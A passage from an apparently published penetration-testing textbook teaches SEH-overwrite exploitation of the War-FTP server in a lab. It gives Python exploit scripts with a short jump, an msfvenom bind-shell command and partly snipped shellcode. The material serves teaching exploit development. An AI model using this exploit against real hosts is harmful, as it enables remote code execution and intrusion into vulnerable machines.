class="title" id="using_a_short_jump" style="clear: both">Using a Short Jump</h2></div></div></div><p>We need to somehow bypass the return address and get to our long string of <span class="emphasis"><em>D</em></span>s, which has plenty of space for our final shellcode. We can use the <code class="literal">short jump</code> assembly instruction to move EIP a short distance. This method is ideal for our purposes because we need to jump over the four bytes of the SEH overwrite.</p><p>The hexadecimal representation of a short jump is <code class="literal">\xEB</code> <span class="emphasis"><em><code class="literal">&lt;length to jump&gt;</code></em></span>. Padding the short jump instruction <code class="literal">\xEB</code> <span class="emphasis"><em><code class="literal">&lt;length to jump&gt;</code></em></span> with two bytes to take up all four bytes before the SEH overwrite, we can jump forward six bytes over the padding and the SEH overwrite.</p><p>Edit the attack string to include a short jump, as shown in <a class="xref" href="ch18.xhtml#adding_a_short_jump" title="Example 18-5. Adding a short jump">Example 18-5</a>.</p><div class="example"><a id="adding_a_short_jump"/><div class="example-title">Example 18-5. Adding a short jump</div><div class="example-contents"><pre class="programlisting">#!/usr/bin/python&#13;
import socket&#13;
buffer = "A" * 569 + "\xEB\x06" + "B" * 2 + "\xCA\x80\x45\x5F" + "D" * 570&#13;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&#13;
connect=s.connect(('192.168.20.10',21))&#13;
response = s.recv(1024)&#13;
print response&#13;
s.send('USER ' + buffer  + '\r\n')&#13;
response = s.recv(1024)&#13;
print response&#13;
s.close()</pre></div></div><p>As shown in <a class="xref" href="ch18.xhtml#adding_a_short_jump" title="Example 18-5. Adding a short jump">Example 18-5</a>, this time we replace the NSEH (previously four <span class="emphasis"><em>B</em></span>s) with <code class="literal">"\xEB\x06" + "B" * 2</code>. Reset your breakpoint at the <code class="literal">POP POP RET</code> before running the exploit again, and when you hit the breakpoint, step through the program line by line (F7) to see what is happening. Now after the <code class="literal">POP POP RET</code> we have a six-byte short jump, as shown in <a class="xref" href="ch18.xhtml#execution_is_redirected_to_the_short_jum" title="Figure 18-19. Execution is redirected to the short jump.">Figure 18-19</a>.</p><div class="figure"><a id="execution_is_redirected_to_the_short_jum"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00193"/><img alt="Execution is redirected to the short jump." src="httpatomoreillycomsourcenostarchimages2030576.png.jpg"/></div></div><div class="figure-title">Figure 18-19. Execution is redirected to the short jump.</div></div><p>Now press <span class="strong"><strong>F7</strong></span> to execute the short jump. As shown in <a class="xref" href="ch18.xhtml#short_jump_gets_us_past_the_seh_overwrit" title="Figure 18-20. The short jump gets us past the SEH overwrite.">Figure 18-20</a>, the short jump successfully bypasses the SEH overwrite address and redirects execution to the rest of our attack string (<span class="emphasis"><em>D</em></span>s).</p><div class="figure"><a id="short_jump_gets_us_past_the_seh_overwrit"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00194"/><img alt="The short jump gets us past the SEH overwrite." src="httpatomoreillycomsourcenostarchimages2030578.png.jpg"/></div></div><div class="figure-title">Figure 18-20. The short jump gets us past the SEH overwrite.</div></div></div><div class="sect1" title="Choosing a Payload"><div class="titlepage"><div><div><h2 class="title" id="choosing_a_payload-id00048" style="clear: both">Choosing a Payload</h2></div></div></div><p><a class="indexterm" id="iddle1919"/><a class="indexterm" id="iddle2259"/>We have now redirected execution a second time, to a longer part of our controlled memory—an ideal place for our shellcode. Now to choose a payload and generate it with Msfvenom, as shown here.</p><a id="pro_id00212"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom -p windows/shell_bind_tcp -s 573 -b '\x00\x40\x0a\x0d'</strong></span>&#13;
[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)&#13;
buf =&#13;
"\xbe\xa5\xfd\x18\xa6\xd9\xc6\xd9\x74\x24\xf4\x5f\x31\xc9" +&#13;
--<span class="emphasis"><em>snip</em></span>--</pre><p>Remember to tell Msfvenom to use a maximum size of 573 bytes and exclude our bad characters for the FTP username. (Again, you might be able to go a little bit longer, but our original exception occurs because we are writing off the end of the stack. We want to make sure all of our shellcode is executed.) Now add the shellcode to our exploit in place of the <span class="emphasis"><em>D</em></span>s. To make the exploit long enough to trigger the SEH overwrite (instead of the saved return pointer overwrite we saw in <a class="xref" href="ch17.xhtml" title="Chapter 17. A Stack-Based Buffer Overflow in Windows">Chapter 17</a>), pad the exploit string out to 1,150 characters with <span class="emphasis"><em>D</em></span>s. The finished exploit is shown in <a class="xref" href="ch18.xhtml#finished_seh_overwrite_exploit" title="Example 18-6. The finished SEH overwrite exploit">Example 18-6</a>. Our shellcode goes directly after our SEH overwrite. (In this example, we again use a Windows bind shell.)</p><div class="example"><a id="finished_seh_overwrite_exploit"/><div class="example-title">Example 18-6. The finished SEH overwrite exploit</div><div class="example-contents"><pre class="programlisting">#!/usr/bin/python&#13;
import socket&#13;
shellcode = ("\xbe\xa5\xfd\x18\xa6\xd9\xc6\xd9\x74\x24\xf4\x5f\x31\xc9" +&#13;
"\xb1\x56\x31\x77\x13\x83\xc7\x04\x03\x77\xaa\x1f\xed\x5a" +&#13;
"\x5c\x56\x0e\xa3\x9c\x09\x86\x46\xad\x1b\xfc\x03\x9f\xab" +&#13;
"\x76\x41\x13\x47\xda\x72\xa0\x25\xf3\x75\x01\x83\x25\xbb" +&#13;
"\x92\x25\xea\x17\x50\x27\x96\x65\x84\x87\xa7\xa5\xd9\xc6" +&#13;
"\xe0\xd8\x11\x9a\xb9\x97\x83\x0b\xcd\xea\x1f\x2d\x01\x61" +&#13;
"\x1f\x55\x24\xb6\xeb\xef\x27\xe7\x43\x7b\x6f\x1f\xe8\x23" +&#13;
"\x50\x1e\x3d\x30\xac\x69\x4a\x83\x46\x68\x9a\xdd\xa7\x5a" +&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
buffer = "A" * 569 + "\xEB\x06" + "B" * 2 + "\xCA\x80\x45\x5F" +  shellcode + "B" * 205&#13;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&#13;
connect=s.connect(('192.168.20.10',21))&#13;
response = s.recv(1024)&#13;
print response&#13;
s.send('USER ' + buffer  + '\r\n')&#13;
response = s.recv(1024)&#13;
print response&#13;
s.close()</pre></div></div><p>When War-FTP is attached to Immunity Debugger, we have to manually tell the debugger to pass SEH to the program. When we run War-FTP without a debugger and an error is encountered, execution is automatically passed to SEH, executing <code class="literal">POP POP RET</code>, the short jump, and finally our shellcode.</p></div><div class="sect1" title="Summary"><div class="titlepage"><div><div><h2 class="title" id="summary-id00049" style="clear: both">Summary</h2></div></div></div><p>We have successfully built an SEH overwrite exploit for War-FTP. Though War-FTP allowed us to exploit the buffer overflow vulnerability by directly overwriting a return address or SEH, some vulnerable programs will not crash in a way that will allow you to control EIP but will allow you to overwrite SEH. In such cases, knowing the steps to exploit this sort of crash is paramount to creating a working exploit. Due to the way structured exception handlers work, you can count on NSEH being at ESP+8 every time you encounter this type of crash. When you overwrite SEH, you will find the pointer to the next SEH record at ESP+8. After executing a <code class="literal">POP POP RET</code> series of instructions from a module that is not compiled with SafeSEH, you will need to execute a short jump to get to your shellcode in the attack string. If you continue in exploit development, you may run into another challenge where <code class="literal">\xEB</code> is a bad character, so you will need to find other ways of performing a jump.</p><p>In the next chapter we will finish up our study of the basics of exploit development with a few odds and ends, such as first discovering a crash using a technique called <span class="emphasis"><em>fuzzing</em></span>, porting public exploit code to meet our needs, and writing our own Metasploit modules.</p></div></section></body></html>